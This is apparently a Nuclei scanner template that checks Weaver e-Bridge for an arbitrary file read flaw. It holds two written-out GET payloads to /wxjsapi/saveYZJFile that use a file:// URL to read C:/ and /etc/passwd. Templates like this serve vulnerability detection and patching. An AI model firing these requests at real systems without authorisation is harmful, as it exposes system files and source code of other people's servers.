id: ebridge-file-read

info:
  name: 泛微云桥(e-Bridge) - 任意文件读取
  author: wintry
  severity: high
  description: 泛微云桥(e-Bridge) 存在任意文件读取漏洞,攻击者可下载任意文件包括网站源码.
  remediation: 将产品升级到最新版本.
  tags: ebridge
  metadata:
    max-request: 2

http:
  - method: GET
    path:
      - '{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt'
      - '{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd/&fileExt=txt'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'id'

      - type: status
        status:
          - 200
